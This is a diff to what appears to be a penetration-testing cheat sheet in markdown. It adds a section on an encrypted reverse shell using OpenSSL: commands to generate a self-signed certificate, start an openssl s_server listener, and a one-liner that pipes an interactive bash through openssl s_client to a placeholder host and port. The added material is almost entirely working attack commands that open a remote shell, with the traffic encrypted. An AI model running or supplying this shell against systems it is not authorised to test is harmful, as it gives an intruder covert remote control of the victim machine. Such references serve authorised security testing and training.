@@ -28,6 +28,19 @@ Source : [http://www.ilmuhacking.com/exploit/belajar-membuat-shellcode-part-1/](
 
 ### Reverse SSL shell openssl - @ThemsonMester
 
+Before the listener can be started, a key pair and a certificate must be generated.
+
+```bash
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+```
+
+#### Listener
+```bash
+openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>
+```
+
+#### Shell
 ```bash
 mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <HOST>:<PORT> > /tmp/s; rm /tmp/s
 ```
+Source : [https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c](https://medium.com/@honze_net/reverse-shell-and-some-magic-39629ccd0e5c)
